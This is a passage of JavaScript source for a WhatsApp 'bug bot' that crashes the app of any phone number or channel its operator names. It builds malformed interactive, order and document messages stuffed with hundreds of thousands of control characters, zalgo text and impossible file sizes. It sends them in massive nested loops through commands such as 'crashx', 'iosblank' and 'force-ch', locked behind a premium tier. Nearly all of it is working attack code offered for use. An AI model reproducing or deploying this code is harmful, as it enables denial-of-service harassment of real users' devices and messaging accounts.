let largeText = "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ".repeat(25);
let deepNested = {
  title: `Super Deep Nested Section ${i}`,
  highlight_label: `Extreme Highlight ${i}`,
  rows: [
{
  title: largeText,
  id: `id${i}`,
  subrows: [
{
  title: "Nested row 1",
  id: `nested_id1_${i}`,
  subsubrows: [
{
  title: "Deep Nested row 1",
  id: `deep_nested_id1_${i}`,
},
{
  title: "Deep Nested row 2",
  id: `deep_nested_id2_${i}`,
},
  ],
},
{
  title: "Nested row 2",
  id: `nested_id2_${i}`,
},
  ],
},
  ],
};
sections.push(deepNested);
  }
  let listMessage = {
title: "Massive Menu Overflow",
sections: sections,
  };
  let message = {
viewOnceMessage: {
  message: {
messageContextInfo: {
  deviceListMetadata: {},
  deviceListMetadataVersion: 2,
},
interactiveMessage: {
  contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
  businessOwnerJid: target,
},
  },
  body: {
text: "P",
  },
  nativeFlowMessage: {
buttons: [
  {
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)",
  },
  {
name: "call_permission_request",
buttonParamsJson: "JSON.stringify(listMessage)",
  },
  {
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
  },
  {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"hiraNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
],
  },
},
  },
},
  };
  await sock.relayMessage(target, message, {
participant: { jid: target },
  });
}

const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: ``,
footerText: ``,
buttons: [
{ buttonId: "\u0003".repeat(749999), buttonText: { displayText: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

async function QpayMsg(target) {
const etc = generateWAMessageFromContent(
target,
proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
fileLength: "974197419741",
pageCount: "974197419741",
mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
fileName: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
mediaKeyTimestamp: "1715880173",
contactVcard: true,
},
hasMediaAttachment: true,
jpegThumbnail: ryclol
},
orderMessage: {
orderId: "CRASHCODE9471",
thumbnail: ryclol,
itemCount: 999999999,
status: "INQUIRY",
surface: "CATALOG",
message:
"�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" +
"᭄".repeat(103000) +
"ꦾ".repeat(70000),
orderTitle: "INFINITY",
sellerJid: "13135550002@s.whatsapp.net",
token:
"AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
totalAmount1000: "100000019492000",
totalCurrencyCode: "IDR",
messageVersion: 2,
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
caption: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ"
},
contentText: "\"😮‍💨\"",
footerText: "",
buttons: [
{
buttonId: "\u0003".repeat(900000),
buttonText: {
    displayText: "⩟"
},
type: 1
}
],
headerType: 3
}
}
}
}
}
}
}),
{
userJid: target,
quoted: cursor
}
);

await sock.relayMessage(target, etc.message, {
participant: { jid: target },
messageId: etc.key.id
});
}


async function NativeCore(target) {
  let NativeCore = {
viewOnceMessage: {
  message: {
messageContextInfo: {
  deviceListMetadata: {},
  deviceListMetadataVersion: 2,
},
interactiveMessage: {
  contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
  businessOwnerJid: target,
},
dataSharingContext: {
  showMmDisclosure: true,
},
  },
  body: {
title: "👑",
text: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "᭄".repeat(9741),
description: "💌",
footer: "",
  },
  nativeFlowMessage: {
buttons: [
  { name: "single_select", buttonParamsJson: "" },
  { name: "view_product", buttonParamsJson: "" },
  { name: "payment_method", buttonParamsJson: "" },
  { name: "call_permission_request", buttonParamsJson: "" },
  { name: "mpm", buttonParamsJson: "" },
  { name: "payment_info", buttonParamsJson: "" },
],
  },
},
  },
},
  };
  await sock.relayMessage(target, NativeCore, {
participant: { jid: target },
  });
  console.log("")
}
    
 async function DilxzCrash(target) {
    for (let i = 0; i <= 50; i++) {
    await CrashJids(target)
    await extendetX(target)
    await buttonscrashX(target)
    await buttoncast(target)
    await paymentCrash(target)
    await NativeCore(target)
    await ioskeresh(target)
    await flowkresh(target)
    await QpayMsg(target)
    }
}

async function DilxzIosBlank(target) {
    for (let i = 0; i <= 50; i++) {
    await IosLocation(target)
    await TrashIos(target)
    }
}

async function DilxzInvisible(target) {
    for (let i = 0; i <= 50; i++) {
    await UiScorpio(target)
    await letterCrash(target)
    await LocUiNew(target)
    }
}

async function DilxzBlankUi(target) {
    for (let i = 0; i <= 50; i++) {
    await bulldozer(target)
    await locationInvis(target)
    await protocolxaudio(target)
    await protocol5(target)
    }
}

async function DilxzForce(target) {
    for (let i = 0; i <= 50; i++) {
    await CursorCrL(target)
    await DocxSystemUi(target) 
    await invicXblank(target)
    await VampNewCrash(target) 
    }
}

async function DilxzCombo(target) {
    for (let i = 0; i <= 50; i++) {
    await bulldozer(target)
    await locationInvis(target)
    await protocolxaudio(target)
    await protocol5(target)
    await UiScorpio(target)
    await letterCrash(target)
    await LocUiNew(target)
    await IosLocation(target)
    await TrashIos(target)
    await CrashJids(target)
    await extendetX(target)
    await buttonscrashX(target)
    await buttoncast(target)
    await paymentCrash(target)
    await NativeCore(target)
    await ioskeresh(target)
    await flowkresh(target)
    await QpayMsg(target)
    await CrashJids(target)
    await extendetX(target)
    await buttonscrashX(target)
    await buttoncast(target)
    await paymentCrash(target)
    await NativeCore(target)
    await ioskeresh(target)
    await flowkresh(target)
    await QpayMsg(target)
    }
}

// Command handler
switch (command) {
case "menu": {
  let menu = `*ー ( ⚡ ) ★†★†★†★† HEY FAM★†★†★†★†💪🗿 ${pushname}*
*★†★†★†★†★†★† デジタルタスクを*
  
*[ ★ ] Information Bot ♣*
◇ Script : �̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ
◇ Status : Access Free
◇ Time : ${time}
◇ Author : 𝙁𝘼𝙈Ø𝙐𝙎 𝘿𝙀𝙑

*[ ★ ] Information Script ♠*
https://whatsapp.com/channel/0029VbAaOJLInlqVwhwtxS33`;

  let buttons = [
    { buttonId: ".owner", buttonText: { displayText: "Owner" } }
  ];

  let buttonMessage = {
  image: {
    url: 'https://files.catbox.moe/j17olw.jpg'
  },
  caption: `${menu}`,
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      showAdAttribution: true,
      title: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
      body: `DilxzВаэлтрикс͢ ϟ`,
      thumbnailUrl: "https://files.catbox.moe/j17olw.jpg",
      sourceUrl: "https://youtube.com",
      mediaType: 1,
      XderLargerThumbnail: true
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  },
  footer: `execution target ϟ`,
  buttons: buttons,
  viewOnce: true,
  headerType: 4
};

  const flowActions = [
    {
      buttonId: 'action',
      buttonText: { displayText: 'This Button List' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: "Options",
          sections: [
            {
              title: "Options Menu",
              highlight_label: "𝙁𝘼𝙈Ø𝙐𝙎 𝘿𝙀𝙑",
              rows: [
                { title: "bug menu", description: "›› menampilkan bug", id: ".bugmenu" },
                { title: "owner menu", description: "›› menampilkan owner", id: `.ownermenu` },
                { title: "runtime menu", description: "›› menampilkan runtime", id: `.runtime` },
                { title: "about menu", description: "›› menampilkan script", id: ".about" },
                { title: "script menu", description: "›› menampilkan script", id: ".script" },
                { title: "thanks menu", description: "›› menampilkan thanks", id: ".tqto" }
              ]
            }
          ]
        })
      },
      viewOnce: true
    }
  ];

  buttonMessage.buttons.push(...flowActions);

  await sock.sendMessage(m.chat, buttonMessage, { quoted: catalems });

  await sock.sendMessage(m.chat, {
    audio: { url: 'https://files.catbox.moe/hk9dw6.mp3' },
    mimetype: 'audio/mp4',
    ptt: false
  }, { quoted: catalems });
}
break;
case "combox": {
    if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE');
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";   
    dilxzreply(bugres)    
    for (let i = 0; i < 250; i++) {
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
    }
}
break
case "crashx": case "voids": {
if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE')
if (!q) return dilxzreply(`Example: ${prefix + command} 628××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dilxzreply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
}
dilxzreply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "iosblank": case "locios": {
if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE')
if (!q) return dilxzreply(`Example: ${prefix + command} 628××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dilxzreply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
}
dilxzreply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "blankui": case "blanking": {
if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE')
if (!q) return dilxzreply(`Example: ${prefix + command} 628××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dilxzreply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
}
dilxzreply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "invisix": case "mention": {
if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE')
if (!q) return dilxzreply(`Example: ${prefix + command} 628××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dilxzreply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
}
dilxzreply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "force": {
if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE')
if (!q) return dilxzreply(`Example: ${prefix + command} 628××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
dilxzreply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
}
dilxzreply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "force-ch": case "crash-ch": {
    if (!isPremium) return dilxzreply('[ ! ] USER NOT IN PREMIUM MODE')
    const targetChannel = args[0];
    if (!targetChannel) {
        return dilxzreply(`Example: ${prefix + command} 123××@newsletter`)
    }
    await sock.sendMessage(m.chat, {
        image: { url: "https://files.catbox.moe/j17olw.jpg" },
        caption: "process sending bug to channel 🦠",
        contextInfo: {
            externalAdReply: {
                title: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
                body: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
                sourceUrl: "https://youtube.com/@dilxzdev",
            },
        },
    });

    for (let i = 0; i < 200; i++) {
        try {
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);

            if (i === 10) {
                await sock.sendMessage(m.chat, {
                    text: `being processed sending... (${i}/${total})`,
                });
            }
        } catch (error) {
            console.error("Gagal mengirim ke Channel:", error);
            return dilxzreply("Terjadi kesalahan saat mengirim ke Channel.");
        }
        await sleep(1000);
    }

    await sock.sendMessage(m.chat, {
        image: { url: "https://files.catbox.moe/j17olw.jpg" },
        caption: "success sending bug to channel 🦠",
        contextInfo: {
            externalAdReply: {
                title: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
                body: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
                sourceUrl: "https://youtube.com/@dilxzdev",
            },
        },
    });

    dilxzreply("Suscesfully sending bug to channel ✅");
}
break;
case 'addprem': case 'addowner': {
if (!Access) return dilxzreply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return dilxzreply(`Example : ${prefix + command} 234××|30d`)
    if (!hari) return dilxzreply(`Example : ${prefix + command} 234××|30d`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return dilxzreply('[ ! ] Khusus User Owner')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return dilxzreply('Suscesfully add user database ✅')
    let data = await sock.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add user database ✅')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `Database Control`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/j17olw.jpg`,
                    sourceUrl: 'https://youtube.com/@dilxzdev'
                }	
            }	
        };	
        return sock.sendMessage(m.chat, contentText, { quoted: catalems })
    } else {		
         dilxzreply("not found")
    }	
}
break
case 'delprem': case 'delowner': {
if (!Access) return dilxzreply(mess.owner)
    if (!args[0]) return dilxzreply(`Example : ${prefix + command} 628××`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return dilxzreply('[ ! ] Khusus User Owner')
    let data = await sock.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        dilxzreply('Suscesfully delete user database ✅')
    } else {	
        dilxzreply("not found")
    }
}
break
case "private": {
if (!Access) return dilxzreply(mess.owner) 
sock.public = false
dilxzreply(`successfully changed mode to ${command}`)
}
break
case "public":{
if (!Access) return dilxzreply(mess.owner) 
sock.public = true
dilxzreply(`successfully changed mode to ${command}`)
}
break
case "ownermenu": {
let Menu = `*[ ★ ] 👑Owner Menu👑*
👑 .addowner 234𝘅𝘅
🗿 .delowner 234𝘅𝘅
👑 .addprem 234𝘅𝘅
🗿 .delprem 234𝘅𝘅
👑 .private 𝗺𝗼𝗱𝗲
🗿 .public 𝗺𝗼𝗱𝗲
👑 > 𝗲𝘃𝗮𝗹
🗿 < 𝗲𝘃𝗮𝗹`
sock.sendMessage(m.chat, {
